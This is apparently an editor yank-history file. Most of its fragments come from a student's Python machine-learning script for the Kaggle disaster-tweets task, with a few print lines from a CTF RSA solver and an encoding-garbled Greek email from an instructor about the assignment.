9f11b20b100916e437302b1b76544c48|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|125|15|v|python
	cv_avg
d261968c0560e9136a6f027a6414620a|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|127|1|V|python
	print(cv_avg)
bdfe82d092aa5761e909daee58818d9c|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|110|40|V|python
	                                       forward = True,
a417b8057b9f91a6d4a0f40a02c7d0e6|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|111|1|V|python
	SequentialFeatureSelector as SFS
f5920246363eb55261f80aa6a4bf8326|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|119|9|v|python
	X, y
359ecfc218d8f01f9a464fc9e4c7a453|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|120|17|v|python
	train_vectors, data_train['target']
724e243ea117fafea71592b878b2f78e|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|112|1|V|python
	sfs = SFS(k_neighbors, # scikit-learn classifier
	    k_features=1, # termination criterion
	    forward=True, # forward selection
	    floating=False,
	    verbose=2, # logging level
	    scoring='accuracy', # criterion function
	    cv=10) 
	sfs.fit(train_vectors, data_train['target'])
7a715d20d40982cdd40b6d87ee9d95db|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|113|1|V|python
	print('\nSequential Forward Selection (k=5):')
	print('Selected features:',sfs.k_feature_idx_) # (0, 9, 5, 6, 8)
	print('Prediction score:',sfs.k_score_) # 0
4b49d8e4d584660aa243bdc612ddf4b8|file:///home/neo/CTFs/midnightsun2020/rsa-yay/solve.py|12|19|V|python
	        print(hex(i))
	        print(hex(j))
303ecd877de8e043f1ef493b0cdae5e6|file:///home/neo/CTFs/midnightsun2020/rsa-yay/solve.py|14|9|V|python
	        # if hex(int(str(hex(prod))[-1:], 16)) == 5:
f95f661d2e3b532cf62ce44f4de010b9|file:///home/neo/CTFs/midnightsun2020/rsa-yay/solve.py|14|1|V|python
	            print(hex(i))
93750dc6697a2262bd5c34a342b4a24d|file:///tmp/neomutt-neo-1000-16994-12830390208097995030|2|1|V|mail
	> ŒìŒµŒπŒ± œÉŒøœÖ ŒùŒµœåœÜœÖœÑŒµ,ŒòŒ± Œ∫Œ±œÑŒµŒ≤Œ¨œÉŒµœÑŒµ œÑŒø training dataset Œ±œÄœå œÑŒø kaggle. ŒëœÖœÑœå Œ∏Œ± œÑŒø œáœâœÅŒØœÉŒµœÑŒµ œÉŒµ ŒΩŒ≠Œø training Œ∫Œ±Œπ ŒΩŒ≠Œø testing. ŒòŒ± Œ∫Œ¨ŒΩŒµœÑŒµ œåŒªŒµœÇ œÉŒ±œÇ œÑŒπœÇ Œ¥ŒøŒ∫ŒπŒºŒ≠œÇ ŒºŒµ cross validation œÄŒ¨ŒΩœâ œÉœÑŒø ŒΩŒµŒø training Œ≥ŒπŒ± ŒΩŒ± ŒµœÄŒπŒªŒ≠ŒæŒµœÑŒµ œÄŒ±œÅŒ±ŒºŒ≠œÑœÅŒøœÖœÇ Œ∫Œ±Œπ ŒºŒøŒΩœÑŒ≠ŒªŒ± Œ∫Œ±Œπ Œ≥ŒπŒ± ŒΩŒ± Œ¥ŒøŒ∫ŒπŒºŒ¨Œ∂ŒµœÑŒµ œÑŒ∑ŒΩ ŒπŒ∫Œ±ŒΩœåœÑŒ∑œÑŒ± œÑŒøœÖ ŒµœÄŒπŒªŒµœáŒ∏ŒµŒΩœÑŒøœÇ ŒºŒøŒΩœÑŒ≠ŒªŒøœÖ Œ∏Œ± Œ¥ŒøŒ∫ŒπŒºŒ¨Œ∂ŒµœÑŒµ œÄŒ¨ŒΩœâ œÉœÑŒø ŒΩŒ≠Œø testing. ŒúŒµ Œ±œÖœÑŒø Œ∏Œ± œÉŒ±œÇ Œ≤Œ±Œ∏ŒºŒøŒªŒøŒ≥ŒÆœÉŒøœÖŒºŒµ. ŒëŒΩ Œ∏ŒµŒªŒµœÑŒµ ŒºŒµœÑŒ± Œ±œÄœå Œ∫Œ¨œÄŒøŒπŒµœÇ Œ¥ŒøŒ∫ŒπŒºŒ≠œÇ ŒΩŒ± Œ±ŒΩŒµŒ≤Œ¨Œ∂ŒµœÑŒµ Œ∫Œ±Œπ œÉœÑŒø kaggle ŒµŒØœÉŒ±œÉœÑŒµ ŒµœÖœÄœÅœåœÉŒ¥ŒµŒ∫œÑŒøŒπ ŒΩŒ± œÑŒø Œ∫Œ¨ŒΩŒµœÑŒµ. ŒëŒΩ œÄŒ¨œÑŒµ Œ∫Œ±ŒªŒ¨ Œ∫Œ±Œπ œÉœÑŒø kaggle Œ±Œ∫œåŒºŒ± Œ∫Œ±ŒªœçœÑŒµœÅŒ± Œ±ŒªŒªŒ± Œ¥ŒµŒΩ ŒµŒπŒΩŒ±Œπ Œ±œÖœÑŒøœÉŒ∫ŒøœÄŒøœÇ œÑŒø kaggle. ŒëŒΩ ŒµœÄŒπŒºŒ≠ŒΩŒµŒπ Œ∑ Œ±œÄŒøœÅŒØŒ± ŒΩŒ± Œ∫Œ±ŒΩŒøŒΩŒØœÉŒøœÖŒºŒµ ŒµŒΩŒ± short meeting œÉœÑŒø ms teams.ŒöŒ±Œªœå Œ±œÄœåŒ≥ŒµœÖŒºŒ±,Œ†Œ±œçŒªŒøœÇSent from my Samsung Galaxy smartphone.
0e66be14b86bd30bf4fc84357763b591|file:///home/neo/Documents/diplomatiki/auth.js/background.tex|18|446|v|tex
	their
10cb7c4ff97262ecb411155f801950d8|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|64|1|V|python
	print(data_train['text'])
92aa4b0634c38b6312e7744223607c79|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|64|1|V|python
	# if remove_outliers:
	#     q3, q1 = np.percentile(data_train['text'], [75, 25])
	#     data_train['text'] = list(filter(lambda a: a>47.5 and a<53.5, data_train['text']))
	
4ad5fcc49eee29acb6e8ddb1c702d5e2|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|109|28|v|python
	data_train['text']
18af9841b45c459725ba8f1c23224b01|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|107|1|V|python
	
	if remove_outliers:
	    q3, q1 = np.percentile(train_vectors, [75, 25])
	    data_train['text'] = list(filter(lambda a: a>47.5 and a<53.5, train_vectors))
2dccbd090f86d1a48df8fb6e6a72d586|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|99|66|v|python
	ctrain_vectors
0f488fda753a6bf4e3e5cad487457796|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|97|1|V|python
	print(word_count)
fb74f052564e475781092a7a219a290b|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|97|1|V|python
	if remove_outliers:
	    q3, q1 = np.percentile(word_count['Frequency'], [75, 25])
	    data_train['text'] = list(filter(lambda a: a>47.5 and a<53.5, word_count['Frequency']))
76758218745177ba9e8b31a3d28c5d49|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|89|1|V|python
	for tweet in train_cleared:
	    for word in tweet.split():
522d45fe1363faf49dfa8b1ab70f50fc|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|88|32|v|python
	_count['Frequency']
75aea1ffcf344f1da8d8e9a0d4777939|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|83|1|V|python
	words = []
	for tweet in train_cleared:
	    for word in tweet.split():
	        words.append(word)
	if remove_outliers:
	    q3, q1 = np.percentile(words, [75, 25])
	    data_train['text'] = list(filter(lambda a: a>47.5 and a<53.5, words))
44bc9c92b1601ba47dda48bb0170db4d|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|56|1|V|python
	# print("location and keyword columns droped successfully")
a483c7fa2418f0dcb95f8b55aac9fe12|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|58|1|V|python
	# print("id column droped successfully")
013c925964856b3577f04b2ccdc87a3c|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|53|1|V|python
	# print(missing_data.head(data_train .shape[1]))
48e8f3e29f4edcd5771c4038b7982d87|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|124|1|V|python
	cv_scores = model_selection.cross_val_score(k_neighbors, X_train, y_train, cv=kfold, scoring="f1")
d37d5b064092a489d2070562ed35c657|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|52|1|V|python
	print(minMaxRescaledX)
8bb0a73222c07e98d67b816de9bba4d7|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|48|1|V|python
	# train the scaler (find min and max)
	scaler = MinMaxScaler(feature_range=(2, 5)).fit(data_train)
	# scale the dataset
	minMaxRescaledX = scaler.transform(data_train)
c8a0f66e0d058bf95ed8ccc6740a6a06|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|102|49|v|python
	data_train
064b9e6ab1dad9e2f191d9758a903e5e|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|99|1|V|python
	vectorizer_max_features = word_count.shape[0]
7fe2bcf8bd3c8fde98ba874cfce0461d|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|104|1|V|python
	# vectorizer_max_features = word_count.shape[0]
638b4f9e34ea82bd8c553b15854764d9|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|101|1|V|python
	# train the scaler (find min and max)
	scaler = MinMaxScaler(feature_range=(2, 5)).fit(word_count)
	# scale the dataset
	minMaxRescaledX = scaler.transform(word_count)
15a341ffc64128c3c7f41813bdc3bdf1|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|43|1|V|python
	clear_data = True
499be308c9ee3f1323aa37196c0708ec|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|53|1|V|python
	print(percent)
16b6d8258d4a4d71e80687ca0f9d1369|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|53|1|V|python
	print(missing_data)
be48cab5a0fc3c765f8c7f63dbd2d4e1|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|58|1|V|python
	if clear_data:
	    data_train['text'] = data_train['text'].apply(lambda x: clear_text(x))
	    data_test['text'] = data_test['text'].apply(lambda x: clear_text(x))
d26a5396d4ed3ee8a68bb55a9595be5a|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|62|14|V|python
	if clear_data:
	    data_train = data_train.apply(lambda x: clear_text(x))
	    data_test = data_testxt'].apply(lambda x: clear_text(x))
db39f62969ec6d01e39141c9bba55cdb|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|55|1|V|python
	data_train  = data_train.drop('id', axis=1)
c8bcb48ed946c52d3178a8fdbf3f385e|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|53|1|V|python
	print(percent.shape[0])
071c9ec4adb81bedccb2983b77f72e36|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|52|1|V|python
	print(percent[0])
5c29c202bcc3accc0c2beeac4061a14f|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|52|1|V|python
	missing_data = pd.concat([total, percent], axis=1, keys=['Total', 'Percent'])
62166657a5fea541e7c3cf483c83eeeb|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|57|24|V|python
	# Lets get the feature importances.
	# Features with high importance score higher.
2d8dc8ae0736d7cd12da47e7063332fb|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|53|1|V|python
	data_train = data_train.drop(['id'], axis=1)
865ec89b7a3975e375885b7d6af2cf50|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|117|32|v|python
	data_train['target']
46d32db27398ce23945cf2066f3b5af1|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|137|5|v|python
	int('F1 Score                   : ' ,f1_score(y_test,y_pred))
ebb6265e4d76ea140ad485690650719a|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|134|5|V|python
	# print('Train Score is             : ' ,k_neighbors.score(X_train, y_train))
	# print('Test Score is              : ' ,k_neighbors.score(X_test, y_test))
	# y_pred = k_neighbors.predict(X_test)
	# print('F1 Score                   : ' ,f1_score(y_test,y_pred))
0adc39cc5593a7eb226440edb225fb71|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|119|1|V|python
	# X = train_vectors
	# y = data_train['target']
	# X_train , X_test , y_train , y_test = train_test_split(X,y,test_size=0.20, random_state=55, shuffle =True)
	# print('Train Score is             : ' ,k_neighbors.score(X_train, y_train))
	# print('Test Score is              : ' ,k_neighbors.score(X_test, y_test))
	# y_pred = k_neighbors.predict(X_test)
	# print('F1 Score                   : ' ,f1_score(y_test,y_pred))
e907aa7e698649027127ba90892843ae|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|137|1|V|python
	# X_train , X_test , y_train , y_test = train_test_split(X,y,test_size=0.20, random_state=55, shuffle =True)
fb975d11ec160526ee31dcd2b1d16d01|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|135|1|V|python
	# X = train_vectors
	# y = data_train['target']
ff37a623ec35622e108795de2f1f208a|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|104|1|V|python
	# train_vectors = vectorizer.fit_transform(train_cleared)
d6d2bde4f40bac05dc6218786194ea0e|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|104|1|V|python
	# train_vectors = vectorizer.fit_transform(train_cleared)
	# test_vectors = vectorizer.transform(test_cleared)
cc797a8a90818526d40bb2f17af4d10a|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|106|42|v|python
	train_cleared
10463421adde18e0c1f01b6ef2646dd5|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|107|37|v|python
	test_cleared
fc76a34d4d21c2c2fe0675da12aa5cd9|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|104|1|V|python
	print(train_vectors)
5110894f939defdc8074f959424d9a82|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|104|1|V|python
	print(data_train)
700c9f6207bc4d0ac998337359c1432b|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|119|1|V|python
	k_neighbors.fit(train_vectors, targets)
b7842df8696646bbb8cc093ba12cd98b|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|106|26|V|python
	# train_vectors = vectorizer.fit_transform(data_train)
	# test_vectors = vectorizer.transform(data_test)
79845174c765246cd78c01dd549234f3|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|118|1|V|python
	k_neighbors.fit(data_train, targets)
d4e5995d01768bdb02decb8ddadc5b38|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|97|1|V|python
	print(vectorizer_max_features)
2937e2f43df4b979e2eaa86cfdac23d7|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|97|1|V|python
	print(word_count[0])
b2f38aec2bf0a0bd38f64b8efdcad012|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|95|2|V|python
	# scale the dataset
	minMaxRescaledX = scaler.transform(x)
	print(minMaxRescaledX)
1bc650038b6fa2848f38f2e4ec94b057|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|94|1|V|python
	scaler = MinMaxScaler(feature_range=(0, 1)).fit(x)
8b09b9a80c8505e8c8bc8d9090ab15fe|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|94|1|V|python
	vectorizer_max_features = word_count.shape[0]
	word_count = word_count[word_count['Frequency'] >= min_frequency_threshold]
875c7cd7f10421d85d16a3f08475760a|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|106|1|V|python
	train_vectors = vectorizer.fit_transform(train_cleared)
	test_vectors = vectorizer.transform(test_cleared)
06cf651506afb3d24abc42f97a6dcac7|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|114|1|V|python
	elements.append(data_train['keywords'])
769c981da48a6e240ee42b1d78c7d7dd|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|115|17|v|python
	data_train['keywords']
a0d85cd899e0b6328091a640d2963e14|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|123|1|V|python
	# k_neighbors.fit(train_vectors, targets)
29f71b400355303b628d76598b668985|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|124|1|V|python
	k_neighbors.fit(elements, targets)
948c9615a58bdd869c318166743e4ac8|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|124|19|v|python
	ain_vectors
6a7f245843454cf4f28ad7c5e2572aa2|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|124|17|v|python
	elements
52ca85922a651f6c50b30f29b81b24e6|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|117|1|V|python
	print(elements)
06dfe50777eed2a4f682e565b9fb7c18|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|113|1|V|python
	elements = []
	elements.append(data_train['keyword'])
	elements.append(train_vectors)
	
de484e0db2d01d495157bc8b62fafeee|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|106|1|V|python
	print(train_cleared)
083e2ae691b1b41677a81b00ff5c7a73|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|107|15|V|python
	elements.append(train_cleared)
	elements.append(data_train['keyword'])
d7df5b64df1181ef1d62d646a13aa860|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|108|33|v|python
	keyword
8b8b365370c8ed3ec02722a625cab0aa|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|107|1|V|python
	elements.append([])
6d3434ffbea5e6c7271dfd2d1719db56|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|110|1|V|python
	elements[0] = data_train['keyword']
b798be9cfbb626e1a4e754ad27cf7f3d|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|111|17|v|python
	ta_train['keyword']
6ab6acbce118c75bbca2f35979de760a|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|107|19|V|python
	elements.append([])
	elements.append([])
	
	elements[0] = data_train['keyword']
	elements[1] = train_cleared
f6b6fbfbb5b3f845183449c04aa62f64|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|106|13|V|python
	elements = []
	for i, element in enumerate(train_cleared):
	    elements.append([data_train['keyword'][i], element])
	print(elements)
628c14e1f9f1507fd78a59c17d68d585|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|109|1|V|python
	train_vectors = vectorizer.fit_transform(elements)
	test_vectors = vectorizer.transform(test_cleared)
fc1143ade5094b30843a7ae6cda72a48|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|49|1|V|python
	print(data_train['keyword'])
fd7335ab177f87ec36bff36c5bdbd1e2|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|49|22|V|python
	print(data_train['keyword'])
	print(data_train['text'])
971b04e4f486abd0fc662ce4b4c38f9d|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|123|1|V|python
	vectorizer.fit_transform()
9944e52db35040ec7f6ab44a7028bb6a|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|123|1|V|python
	print(elements[0])
18d1e3e2be76eeec8328984c7bf62e00|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|123|1|V|python
	train_vectors = vectorizer.fit_transform(elements[0],elements[1])
d0a3765e68b4c90a9a6c288f3815befa|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|123|1|V|python
	print('\n\n\n---------------\n\n\n')
aaaca070a490d1f4c14ad795069b98ce|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|125|1|V|python
	test_vectors = vectorizer.transform(elements2[0],elements2[1])
75650a73b2c48c409153e896cf666574|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|123|1|V|python
	train_vectors = vectorizer.fit_transform(train_cleared, data_train['keyword'])
	print(train_vectors)
a36307dada3d47b4e1792dc4ddaaabb9|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|127|1|V|python
	print)
6110fa724d180c7c82ce0b55c536ed85|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|125|1|V|python
	print(data_train['keyword'].shape[0])
eb824e9c60c22186713656d2f9a4e0f0|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|124|1|V|python
	print(train_vectors.shape[0])
ba3335ed05da1b469ce161929bcf44dc|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|101|1|V|python
	# scale the dataset
	# scaler = MinMaxScaler(feature_range=(0, 1)).fit(word_count)
	# word_count = scaler.transform(word_count)
	vectorizer_max_features = word_count.shape[0]
2b1df0d053a5836ef51a740888085bf8|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|107|1|V|python
	elements = []
	elements.append([])
	elements.append([])
	elements[0] = train_keyword
	elements[1] = train_cleared
	
	elements2 = []
	elements2.append([])
	elements2.append([])
	elements2[0] = test_keyword
	elements2[1] = test_cleared
2d2d82286aba79ada32c6b6bd6a89cae|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|82|1|V|python
	for i, _ in enumerate(data_train["text"]):
	    data_train["text"].values[i] = train_cleared[i]
	for i, _ in enumerate(data_test["text"]):
	    data_test["text"].values[i] = test_cleared[i]
58fa0e0d6d129f0b5e4a4aed05b963d8|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|101|1|V|python
	# scale the dataset
	# scaler = MinMaxScaler(feature_range=(0, 1)).fit(word_count)
	# word_count = scaler.transform(word_count)
7d7251f57a7b9b244a26666a17e6e460|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|82|1|V|python
	for i, _ in enumerate(data_train["text"]):
	    data_train["text"].values[i] = train_cleared[i]
	for i, _ in enumerate(data_test["text"]):
	    data_test["text"].values[i] = test_cleared[i]
	
725dd838ba823a844db6245d787e1ada|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|104|1|V|python
	train_vectors = vectorizer.fit_transform(train_cleared)
96d9404f9039d9ab856605c98897aefe|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|105|1|V|python
	target_vectors = vectorizer.fit_transform(targets)
aa6f6d62574dedec24672f4ae1c9ca26|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|105|44|v|python
	targets
d32919ab59c234bdbdb94e4fe6d0e8fe|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|112|1|V|python
	for i, _ in enumerate(data_train["text"]):
	    data_train["text"].values[i] = train_vectors[i]
	for i, _ in enumerate(data_test["text"]):
	    data_test["text"].values[i] = test_vectors[i]
29b94048ab0fe27828e195a7ed813e0e|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|113|5|V|python
	    keyword = 
0942b20dda9e8170577f7459c36fa3e1|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|104|1|V|python
	print(targets)
07c010caca87e604b4a999ef1d9eee7b|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|104|44|v|python
	data_train['keyword']
848221d2fb096dc6a581756de39262b8|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|129|28|v|python
	target_vectors
ffaad6c89d31604f27fb89e85a7ff691|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|112|5|V|python
	    print(keyword)
1427d80fc26f3af6736af13c10c8116e|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|111|1|V|python
	for i, keyword in enumerate(data_train["keyword"]):
	    data_train["keyword"].values[i] = keyword_vectors[i]
	# for i, _ in enumerate(data_test["text"]):
	#     data_test["text"].values[i] = test_vectors[i]
379f648f4d4b35f5288228644e1555e5|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|116|12|V|python
	print(train_vectors.shape[0])
	print(data_train['keyword'].shape[0])
e603be450b25a1b3bfc7200031063932|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|104|1|V|python
	keyword_vectors = vectorizer.fit_transform(train_keyword)
39d1c941672b83ea782d4daffb611675|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|115|34|v|python
	train_keyword
3ec95a556492c0f7f7631503b65a4214|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|115|1|V|python
	tuples = list(zip(train_vectors, data_train['keyword']))
d263ae52a2a6e9fbd4904bfdf7076619|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|115|1|V|python
	print(tuples[0])
a8f8a68e584491143ded0b2c4c307b9e|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|117|1|V|python
	print(df)
69f6fb392df9578d0b18575dad260e6a|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|48|13|v|python
	pd.read_csv("datasets/test.csv")
	
	#get total count of data including missing data
	total = data_train.isnull().sum().sort_values(ascending=False)
	#get percent of missing data relevant to all data
	percent = (data_train.isnull().sum()/data_train.isnull().count()).sort_values(ascending=False)
	targets = data_train['target']
	data_train = data_train.drop(['id','location', 'target'], axis=1)
	# estimator = ExtraTreesClassifier(n_estimators=100, random_state=0)
	# estimator.fit(data_train,targets)
	# importances = estimator.feature_importances_
	
	if clear_data:
	    data_train['text'] = data_train['text'].apply(lambda x: clear_text(x))
	    data_test['text'] = data_test['text'].apply(lambda x: clear_text(x))
	
	stop_words = set(stopwords.words('english'))
	pstem = PorterStemmer()
	
	# Remove the stopwords from train and test dataset and use PorterStemmer to remove the word endings
	train_cleared = []
	for i, sentence in enumerate(data_train["text"]):
	    cleared_tweet = ' '.join([pstem.stem(word) for word in sentence.split(' ') if not word in stop_words])
	    train_cleared.append(cleared_tweet)
	test_cleared = []
	for i, sentence in enumerate(data_test["text"]):
	    cleared_tweet = ' '.join([pstem.stem(word) for word in sentence.split(' ') if not word in stop_words])
	    test_cleared.append(cleared_tweet)
	train_keyword = []
	for x in data_train["keyword"] :
		train_keyword.append(str(x))
	test_keyword = []
	for x in data_test["keyword"] :
		test_keyword.append(str(x))
	# Count the occurences of each word
	word_count = {}
	for tweet in train_cleared:
	    for word in tweet.split():
	        if(word in word_count.keys()):
	            word_count[word] += 1
	        else:
	            word_count[word] = 1
	            
	# Convert dictionary to dataFrame
	
	word_count = 
515fe66b1e7cd5181631adf14932593f|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|93|14|v|python
	pd.DataFrame.from_dict(word_count, orient='index', columns=['Frequency'])
45707a64b9a1b6bc84e1a9da92b8275d|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|117|82|v|python
	DataFrame(d)
17a5c2057c872deb451dcce3d89850f1|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|117|29|v|python
	worw_count
7cf395303ce3665a9834721d4b748e4b|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|117|58|v|python
	Frequency
68fef915a0927b78041fb2bdfe9ae24b|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|116|1|V|python
	d = {'Keyword': keyword_vectors, 'Sentence': train_vectors}
46ae5af81b80eba0cf86d642fdd6c3a0|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|117|1|V|python
	print(df1)
56522376472ffe6bc21de6d97134c2ab|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|118|5|V|python
	    print(d)
da4e23c17fc57709c05c61d5c927e37a|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|117|1|V|python
	for d in df1:
351f617350caea403a02517d2ebcf46e|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|118|1|V|python
	print(df2)
16ab033a10e610823e22f1d8b67865ff|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|56|1|V|python
	# estimator = ExtraTreesClassifier(n_estimators=100, random_state=0)
	# estimator.fit(data_train,targets)
	# importances = estimator.feature_importances_
	
22b6e2a1962bf2203058aa29a02979e4|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|73|1|V|python
	train_keyword = []
	for x in data_train["keyword"] :
		train_keyword.append(str(x))
	test_keyword = []
	for x in data_test["keyword"] :
		test_keyword.append(str(x))
3d72722c2a93c00aad9cdc2abbb30bca|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|107|1|V|python
	df1 = pd.DataFrame(keyword_vectors)
	df2 = pd.DataFrame(train_vectors)
	df1.reset_index(drop=True, inplace=True)
	df2.reset_index(drop=True, inplace=True)
	df = pd.concat([df1, df2], axis=1)
	# df = pd.DataFrame.from_dict(d, orient='index', columns=['Keyword', 'Sentece'])
706cc807c983721d9babdc608e640515|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|114|1|V|python
	k_neighbors.fit(df, targets)
1d154d10d04845f9283580b91117cc1d|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|15|1|V|python
	from sklearn.preprocessing import MinMaxScaler
	from sklearn.ensemble import ExtraTreesClassifier
52367e7200f57e02c6028174c493b59e|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|5|1|V|python
	# import nltk
0b3911bba1cc73eb41c8dd7cbc68326a|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|5|1|V|python
	import string
ffa04217f44e4a2773e75640c9d63ad8|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|13|1|V|python
	import math
baa433b322c4dac9c17253ac9ac774a8|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|13|1|V|python
	import warnings
016822e1d70754a109a2f89b206ba463|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|16|24|v|python
	 # Lowers score, doesn't make sense
146de3300a1a9287020c1d69a5e42538|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|22|35|v|python
	# Remove newlines, increase in score
cbba78c1713bf339da729483632863eb|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|36|15|V|python
	### Remove outliers
	remove_outliers = True
a61c0d9149c5ea80e812d594b7d4bd75|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|36|1|V|python
	### Clear data using the clear_text function
	clear_data = True
27842bac1cfc4aec3969c485295cf36d|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|44|1|V|python
	#get percent of missing data relevant to all data
90b8febdb977ee4eb5c5167e87307bbf|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|42|1|V|python
	#get total count of data including missing data
44853c35e5504bd9d9e739dc95b68c6f|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|93|1|V|python
	
	# for i, _ in enumerate(data_train["text"]):
